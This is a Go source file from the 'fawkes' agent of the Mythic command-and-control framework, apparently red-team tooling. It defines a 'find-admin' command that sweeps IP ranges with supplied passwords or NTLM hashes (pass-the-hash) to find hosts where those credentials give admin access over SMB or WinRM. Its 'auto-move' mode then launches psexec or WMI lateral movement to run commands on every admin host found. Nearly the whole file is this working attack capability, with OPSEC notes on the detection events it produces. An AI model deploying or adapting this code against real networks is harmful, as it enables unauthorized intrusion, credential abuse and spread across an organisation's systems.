package agentfunctions

import (
	"encoding/json"
	"fmt"
	"path/filepath"
	"strings"

	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
	"github.com/MythicMeta/MythicContainer/mythicrpc"
)

func init() {
	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
		Name: "find-admin",
		AssociatedBrowserScript: &agentstructs.BrowserScript{
			ScriptPath: filepath.Join(".", "fawkes", "browserscripts", "find_admin_new.js"),
			Author:     "@galoryber",
		},
		Description:         "Sweep hosts to discover where credentials have admin access via SMB and/or WinRM. Tests C$ share access (SMB) or whoami execution (WinRM).",
		HelpString:          "find-admin -hosts 192.168.1.0/24 -username DOMAIN\\admin -password pass\nfind-admin -hosts 10.0.0.1-10 -username admin -hash aad3b435b51404ee:8846f7eaee8fb117 -method both\nfind-admin -hosts dc01,dc02,srv01 -username user@domain.local -password pass -method winrm",
		Version:             1,
		Author:              "@galoryber",
		MitreAttackMappings: []string{"T1021.002", "T1021.006", "T1135"},
		CommandAttributes: agentstructs.CommandAttribute{
			SupportedOS: []string{
				agentstructs.SUPPORTED_OS_WINDOWS,
				agentstructs.SUPPORTED_OS_LINUX,
				agentstructs.SUPPORTED_OS_MACOS,
			},
		},
		TaskCompletionFunctions: map[string]agentstructs.PTTaskCompletionFunction{
			"autoMoveFindDone":    autoMoveFindDone,
			"autoMoveLateralDone": autoMoveLateralDone,
		},
		CommandParameters: []agentstructs.CommandParameter{
			{
				Name:             "action",
				CLIName:          "action",
				ModalDisplayName: "Action",
				Description:      "scan: standard admin sweep. auto-move: find admin hosts then automatically lateral move to them via psexec/wmi.",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
				Choices:          []string{"scan", "auto-move"},
				DefaultValue:     "scan",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "lateral_method",
				CLIName:          "lateral_method",
				ModalDisplayName: "Lateral Method (auto-move)",
				Description:      "Lateral movement method for auto-move: psexec (service creation), wmi (WMI process create). Only used with auto-move action.",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
				Choices:          []string{"psexec", "wmi"},
				DefaultValue:     "psexec",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "lateral_command",
				CLIName:          "lateral_command",
				ModalDisplayName: "Command (auto-move)",
				Description:      "Command to execute on discovered admin hosts (auto-move only). Example: whoami or powershell -enc ...",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:     "whoami /all",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:                "hosts",
				CLIName:             "hosts",
				ModalDisplayName:    "Target Hosts",
				Description:         "Comma-separated IPs, CIDR ranges, IP ranges, or hostnames (e.g., 192.168.1.0/24,10.0.0.1-10,dc01)",
				ParameterType:       agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:        "",
				DynamicQueryFunction: getActiveHostList,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: true, GroupName: "Default"},
				},
			},
			{
				Name:             "username",
				CLIName:          "username",
				ModalDisplayName: "Username",
				Description:      "Username for authentication (supports DOMAIN\\user or user@domain format)",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: true, GroupName: "Default"},
				},
			},
			{
				Name:             "password",
				CLIName:          "password",
				ModalDisplayName: "Password",
				Description:      "Password for authentication (or use -hash for pass-the-hash)",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "hash",
				CLIName:          "hash",
				ModalDisplayName: "NTLM Hash",
				Description:      "NT hash for pass-the-hash (LM:NT or pure NT hex format)",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "domain",
				CLIName:          "domain",
				ModalDisplayName: "Domain",
				Description:      "NTLM domain (auto-detected from username if DOMAIN\\user or user@domain format)",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "method",
				CLIName:          "method",
				ModalDisplayName: "Test Method",
				Description:      "Admin check method: smb (C$ share), winrm (whoami exec), or both",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
				Choices:          []string{"smb", "winrm", "both"},
				DefaultValue:     "smb",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "timeout",
				CLIName:          "timeout",
				ModalDisplayName: "Timeout (seconds)",
				Description:      "Connection timeout per host in seconds (default: 5)",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_NUMBER,
				DefaultValue:     5,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "concurrency",
				CLIName:          "concurrency",
				ModalDisplayName: "Max Concurrent",
				Description:      "Maximum concurrent host checks (default: 50)",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_NUMBER,
				DefaultValue:     50,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
		},
		TaskFunctionParseArgString: func(args *agentstructs.PTTaskMessageArgsData, input string) error {
			if input == "" {
				return nil
			}
			return args.LoadArgsFromJSONString(input)
		},
		TaskFunctionParseArgDictionary: func(args *agentstructs.PTTaskMessageArgsData, input map[string]interface{}) error {
			return args.LoadArgsFromDictionary(input)
		},
		TaskFunctionOPSECPre: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTTaskOPSECPreTaskMessageResponse {
			action, _ := taskData.Args.GetStringArg("action")
			method, _ := taskData.Args.GetStringArg("method")
			msg := fmt.Sprintf("OPSEC WARNING: Sweeping hosts for admin access via %s (T1021.002, T1135). Network authentication attempts generate logon events (4624/4625) on each target and may trigger SIEM lateral movement alerts. Large host lists amplify detection risk.", method)
			if action == "auto-move" {
				lateralMethod, _ := taskData.Args.GetStringArg("lateral_method")
				hosts, _ := taskData.Args.GetStringArg("hosts")
				msg = fmt.Sprintf("OPSEC WARNING: Lateral Movement Chain will (1) sweep %s for admin access via %s, then (2) automatically execute commands on every admin host via %s. This generates authentication events on ALL targets plus service creation/WMI activity on admin hosts. Very high detection risk — SMB logon events (4624/4625), service creation (7045), and process creation (4688) on multiple hosts in rapid succession.", hosts, method, lateralMethod)
			}
			return agentstructs.PTTTaskOPSECPreTaskMessageResponse{
				TaskID: taskData.Task.ID, Success: true,
				OpsecPreBlocked: false, OpsecPreMessage: msg,
				OpsecPreBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
			}
		},
		TaskFunctionProcessResponse: func(processResponse agentstructs.PtTaskProcessResponseMessage) agentstructs.PTTaskProcessResponseMessageResponse {
			response := agentstructs.PTTaskProcessResponseMessageResponse{
				TaskID:  processResponse.TaskData.Task.ID,
				Success: true,
			}
			responseText, ok := processResponse.Response.(string)
			if !ok || responseText == "" || responseText == "[]" {
				return response
			}
			// Parse JSON array of results, track admin-confirmed hosts
			var results []struct {
				Host   string `json:"host"`
				Method string `json:"method"`
				Admin  bool   `json:"admin"`
			}
			if err := json.Unmarshal([]byte(responseText), &results); err != nil {
				return response
			}
			for _, r := range results {
				if r.Admin {
					createArtifact(processResponse.TaskData.Task.ID, "Network Connection",
						fmt.Sprintf("Admin access confirmed: %s via %s", r.Host, r.Method))
				}
			}
			return response
		},
		TaskFunctionCreateTasking: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
			response := agentstructs.PTTaskCreateTaskingMessageResponse{
				Success: true,
				TaskID:  taskData.Task.ID,
			}

			action, _ := taskData.Args.GetStringArg("action")
			hosts, _ := taskData.Args.GetStringArg("hosts")
			method, _ := taskData.Args.GetStringArg("method")

			if action == "auto-move" {
				lateralMethod, _ := taskData.Args.GetStringArg("lateral_method")
				lateralCmd, _ := taskData.Args.GetStringArg("lateral_command")
				if lateralCmd == "" {
					lateralCmd = "whoami /all"
				}

				display := fmt.Sprintf("Lateral Movement Chain: sweep %s via %s → %s on admin hosts → '%s'",
					hosts, method, lateralMethod, lateralCmd)
				response.DisplayParams = &display

				// Store chain context so completion functions can access it
				username, _ := taskData.Args.GetStringArg("username")
				password, _ := taskData.Args.GetStringArg("password")
				hash, _ := taskData.Args.GetStringArg("hash")
				domain, _ := taskData.Args.GetStringArg("domain")
				chainCtx, _ := json.Marshal(map[string]string{
					"lateral_method":  lateralMethod,
					"lateral_command": lateralCmd,
					"username":        username,
					"password":        password,
					"hash":            hash,
					"domain":          domain,
				})
				chainCtxStr := string(chainCtx)
				response.Stdout = &chainCtxStr

				// Step 1: Create find-admin subtask to discover admin hosts
				callbackFunc := "autoMoveFindDone"
				findParams := map[string]interface{}{
					"action":   "scan",
					"hosts":    hosts,
					"username": username,
					"method":   method,
				}
				if password != "" {
					findParams["password"] = password
				}
				if hash != "" {
					findParams["hash"] = hash
				}
				if domain != "" {
					findParams["domain"] = domain
				}
				paramsJSON, _ := json.Marshal(findParams)

				subtaskResult, err := mythicrpc.SendMythicRPCTaskCreateSubtask(
					mythicrpc.MythicRPCTaskCreateSubtaskMessage{
						TaskID:                  taskData.Task.ID,
						SubtaskCallbackFunction: &callbackFunc,
						CommandName:             "find-admin",
						Params:                  string(paramsJSON),
					},
				)
				if err != nil || !subtaskResult.Success {
					errMsg := "Failed to create find-admin subtask"
					if err != nil {
						errMsg = fmt.Sprintf("Failed to create find-admin subtask: %s", err.Error())
					}
					response.Success = false
					response.Error = errMsg
					return response
				}

				createArtifact(taskData.Task.ID, "Subtask Chain",
					fmt.Sprintf("Lateral Movement Chain: find-admin %s → %s on admin hosts", hosts, lateralMethod))
				return response
			}

			displayMsg := fmt.Sprintf("Sweep %s via %s", hosts, method)
			response.DisplayParams = &displayMsg

			mythicrpc.SendMythicRPCArtifactCreate(mythicrpc.MythicRPCArtifactCreateMessage{
				TaskID:           taskData.Task.ID,
				BaseArtifactType: "API Call",
				ArtifactMessage:  fmt.Sprintf("Admin access sweep via %s on %s", method, hosts),
			})

			return response
		},
	})
}

// autoMoveFindDone handles find-admin completion in the lateral movement chain.
// Parses admin hosts from find-admin results, creates lateral movement subtasks.
func autoMoveFindDone(taskData *agentstructs.PTTaskMessageAllData, subtaskData *agentstructs.PTTaskMessageAllData, groupName *agentstructs.SubtaskGroupName) agentstructs.PTTaskCompletionFunctionMessageResponse {
	response := agentstructs.PTTaskCompletionFunctionMessageResponse{
		TaskID:  taskData.Task.ID,
		Success: true,
	}

	// Get find-admin results
	responseText := getSubtaskResponses(subtaskData.Task.ID)
	if responseText == "" {
		completed := true
		response.Completed = &completed
		msg := "Lateral Movement Chain: find-admin returned no results"
		response.Stdout = &msg
		mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
			TaskID: taskData.Task.ID, Response: []byte(msg),
		})
		return response
	}

	// Parse JSON results to find hosts with admin=true
	var adminHosts []string
	var results []struct {
		Host   string `json:"host"`
		Admin  bool   `json:"admin"`
		Method string `json:"method"`
	}
	if err := json.Unmarshal([]byte(responseText), &results); err != nil {
		// Try line-by-line NDJSON
		for _, line := range strings.Split(responseText, "\n") {
			line = strings.TrimSpace(line)
			if line == "" {
				continue
			}
			var single struct {
				Host  string `json:"host"`
				Admin bool   `json:"admin"`
			}
			if err := json.Unmarshal([]byte(line), &single); err == nil && single.Admin {
				adminHosts = append(adminHosts, single.Host)
			}
		}
	} else {
		for _, r := range results {
			if r.Admin {
				adminHosts = append(adminHosts, r.Host)
			}
		}
	}

	// Deduplicate hosts
	hostSet := map[string]bool{}
	var uniqueHosts []string
	for _, h := range adminHosts {
		if !hostSet[h] {
			hostSet[h] = true
			uniqueHosts = append(uniqueHosts, h)
		}
	}

	mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
		TaskID:   taskData.Task.ID,
		Response: []byte(fmt.Sprintf("[Step 1/2] Admin sweep complete. Found %d admin hosts: %s", len(uniqueHosts), strings.Join(uniqueHosts, ", "))),
	})

	if len(uniqueHosts) == 0 {
		completed := true
		response.Completed = &completed
		msg := "Lateral Movement Chain complete: no admin hosts found"
		response.Stdout = &msg
		mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
			TaskID: taskData.Task.ID, Response: []byte(msg),
		})
		return response
	}

	// Get chain context from parent task
	// Use extractChainContext to handle Mythic appending extra lines to Stdout
	chainCtx := extractChainContext(taskData.Task.Stdout)

	lateralMethod := chainCtx["lateral_method"]
	lateralCmd := chainCtx["lateral_command"]
	if lateralCmd == "" {
		lateralCmd = "whoami /all"
	}

	// Step 2: Create lateral movement subtasks for each admin host
	var tasks []mythicrpc.MythicRPCTaskCreateSubtaskGroupTasks
	groupCallback := "autoMoveLateralDone"

	for _, host := range uniqueHosts {
		var params map[string]interface{}
		switch lateralMethod {
		case "wmi":
			params = map[string]interface{}{
				"host":    host,
				"action":  "exec",
				"command": lateralCmd,
			}
			if chainCtx["username"] != "" {
				params["username"] = chainCtx["username"]
			}
			if chainCtx["password"] != "" {
				params["password"] = chainCtx["password"]
			}
			if chainCtx["hash"] != "" {
				params["hash"] = chainCtx["hash"]
			}
		default: // psexec
			params = map[string]interface{}{
				"host":    host,
				"command": lateralCmd,
			}
		}

		paramsJSON, _ := json.Marshal(params)
		tasks = append(tasks, mythicrpc.MythicRPCTaskCreateSubtaskGroupTasks{
			CommandName: lateralMethod,
			Params:      string(paramsJSON),
		})
	}

	_, err := mythicrpc.SendMythicRPCTaskCreateSubtaskGroup(
		mythicrpc.MythicRPCTaskCreateSubtaskGroupMessage{
			TaskID:                taskData.Task.ID,
			GroupName:             "lateral_movement_chain",
			GroupCallbackFunction: &groupCallback,
			Tasks:                 tasks,
		},
	)
	if err != nil {
		completed := true
		response.Completed = &completed
		msg := fmt.Sprintf("Lateral Movement Chain: failed to create lateral movement subtasks: %s", err.Error())
		response.Stderr = &msg
		return response
	}

	mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
		TaskID:   taskData.Task.ID,
		Response: []byte(fmt.Sprintf("[Step 2/2] Created %d %s subtasks for admin hosts.", len(tasks), lateralMethod)),
	})

	return response
}

// autoMoveLateralDone handles completion of all lateral movement subtasks.
func autoMoveLateralDone(taskData *agentstructs.PTTaskMessageAllData, subtaskData *agentstructs.PTTaskMessageAllData, groupName *agentstructs.SubtaskGroupName) agentstructs.PTTaskCompletionFunctionMessageResponse {
	response := agentstructs.PTTaskCompletionFunctionMessageResponse{
		TaskID:  taskData.Task.ID,
		Success: true,
	}

	// Aggregate all subtask results
	parentID := taskData.Task.ID
	searchResult, err := mythicrpc.SendMythicRPCTaskSearch(mythicrpc.MythicRPCTaskSearchMessage{
		TaskID:             parentID,
		SearchParentTaskID: &parentID,
	})

	summary := "=== Lateral Movement Chain Complete ===\n"
	if err == nil && searchResult.Success {
		successCount := 0
		errorCount := 0
		for _, task := range searchResult.Tasks {
			if task.Status == "error" {
				errorCount++
			} else if task.Completed {
				successCount++
			}
			summary += fmt.Sprintf("[%s] %s %s\n", task.Status, task.CommandName, task.DisplayParams)
		}
		summary += fmt.Sprintf("\nTotal: %d subtasks (%d success, %d errors)\n", len(searchResult.Tasks), successCount, errorCount)
	} else {
		summary += "Could not retrieve subtask details.\n"
	}

	completed := true
	response.Completed = &completed
	response.Stdout = &summary

	mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
		TaskID:   parentID,
		Response: []byte(summary),
	})

	return response
}
